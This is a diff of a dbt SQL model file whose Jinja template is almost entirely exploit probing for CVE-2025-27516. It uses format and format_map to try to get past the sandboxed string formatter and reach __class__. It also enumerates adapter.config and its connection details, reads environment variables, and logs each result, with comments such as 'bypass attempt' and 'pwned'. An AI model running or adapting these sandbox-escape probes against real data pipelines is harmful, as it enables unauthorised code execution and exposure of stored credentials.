@@ -1,47 +1,36 @@
-{# CVE-2025-27516 differential test + alternative escapes #}
+{# Final CVE-2025-27516 format_map test #}
 
-{# T1: non-underscore attr via format — proves SandboxedFormatter #}
-{% set f1 = '{0.real}'|attr('format') %}
-{{ log("T1_REAL=" ~ f1(42), info=True) }}
-
-{# T2: format_map bypass attempt #}
+{# T1: format_map with __class__ via dict #}
 {% set fm = ''|attr('format_map') %}
-{{ log("T2_FMAP_TYPE=" ~ (fm | string), info=True) }}
+{{ log("T1_FM=" ~ (fm | string), info=True) }}
 
-{# T3: Jinja2 version detection #}
-{% set jinja_env = '' %}
-{% for key in adapter.config.credentials|attr('items')() if False %}{% endfor %}
-{{ log("T3_DBT_VERSION=" ~ dbt_version, info=True) }}
+{# T2: Call format_map — does it bypass SandboxedFormatter? #}
+{% set fm2 = '{self.__class__}'|attr('format_map') %}
+{% set r2 = fm2({'self': ''}) %}
+{{ log("T2_FM_CLASS=" ~ r2, info=True) }}
 
-{# T4: modules.re chain exploration #}
-{% set re_mod = modules.re %}
-{% set re_comp = re_mod.compile %}
-{{ log("T4_RE_COMPILE=" ~ (re_comp | string), info=True) }}
-{% set pattern = re_comp('test') %}
-{{ log("T4_PATTERN_TYPE=" ~ (pattern | string), info=True) }}
+{# T3: Jinja2 version from env #}
+{% set env_keys = [] %}
+{% for key in ['jinja2', 'JINJA2_VERSION', 'jinja_version'] %}
+  {{ log("T3_ENV_" ~ key ~ "=" ~ env_var(key, 'NOT_SET'), info=True) }}
+{% endfor %}
 
-{# T5: Access non-underscore attrs on re pattern object #}
-{% set f5 = '{0.pattern}'|attr('format') %}
-{{ log("T5_PATTERN_ATTR=" ~ f5(pattern), info=True) }}
-{% set f5b = '{0.flags}'|attr('format') %}
-{{ log("T5_FLAGS=" ~ f5b(pattern), info=True) }}
-{% set f5c = '{0.groups}'|attr('format') %}
-{{ log("T5_GROUPS=" ~ f5c(pattern), info=True) }}
+{# T4: Try to access module paths via format #}
+{% set f4 = '{0.pattern}'|attr('format') %}
+{% set pat = modules.re.compile('test') %}
+{{ log("T4_PAT_STR=" ~ (pat | string), info=True) }}
 
-{# T6: Try accessing subclasses via type() in format #}
-{% set f6 = '{0.denominator}'|attr('format') %}
-{{ log("T6_DENOM=" ~ f6(42), info=True) }}
+{# T5: Probe adapter.config dict-style access #}
+{% set f5 = '{0[project_name]}'|attr('format') %}
+{{ log("T5_PROJECT=" ~ f5(adapter.config), info=True) }}
 
-{# T7: Enumerate available context objects #}
-{{ log("T7_ADAPTER_TYPE=" ~ (adapter | string), info=True) }}
-{{ log("T7_CONFIG_TYPE=" ~ (adapter.config | string), info=True) }}
+{# T6: Try adapter connections via format #}
+{% set f6 = '{0.config}'|attr('format') %}
+{{ log("T6_ADAPTER_CONFIG=" ~ (f6(adapter) | string)[:200], info=True) }}
 
-{# T8: Check if builtins accessible #}
-{% set f8 = '{0.bit_length}'|attr('format') %}
-{{ log("T8_BIT_LEN=" ~ f8(255), info=True) }}
-
-{# T9: Try to find Jinja2 version from environment #}
-{% set f9 = '{0.sandboxed}'|attr('format') %}
-{{ log("T9_ENV=" ~ f9(adapter), info=True) }}
+{# T7: Check if we can use __getattr__ through item access #}
+{% set test_dict = {'__class__': 'pwned', '__globals__': 'pwned2'} %}
+{% set f7 = '{0[__class__]}'|attr('format') %}
+{{ log("T7_DICT_ITEM=" ~ f7(test_dict), info=True) }}
 
 SELECT 1 as id
